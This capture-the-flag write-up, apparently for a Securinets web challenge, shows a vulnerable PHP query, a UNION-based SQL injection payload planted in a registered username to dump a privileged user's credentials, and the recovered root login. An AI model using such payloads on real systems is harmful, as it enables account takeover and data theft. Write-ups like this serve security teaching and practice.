<h2>Solution</h2>

<p>The target is to connect to <code>https://web5.ctfsecurinets.com/flags.php</code> with a user having the proper <code>role</code> value (i.e. <code>1</code>).</p>

<p>Analyzing the source files, a code vulnerable to SQL injection can be spotted into <code>index.php</code>.</p>

<p><code>php
$sql = "SELECT * FROM posts WHERE author = '". $_SESSION['username'] ."'";
</code></p>

<p>The username taken from the session is not properly sanitized. This vulnerability could be triggered via the own username after the authentication.</p>

<p>The database is like the following (based on <code>create_db.sql</code>).</p>

<p><code>sql
create database webn;
create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
</code></p>

<p>So, a possible malicious input for the username, in order to print the details of the user with the proper role, is the following.</p>

<p><code>sql
' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
</code></p>

<p>A user with this value for the username must be registered. After the first automatic login, the SQL injection will not have effect: you have to logout and re-login in order to find the details of the searched user under the post search section.</p>

<p><code>
root
jjLLgTGk3uif2rKBVwqH
</code></p>

<p>Logging in with that user and connecting to <code>https://web5.ctfsecurinets.com/flags.php</code> will print the flag.</p>
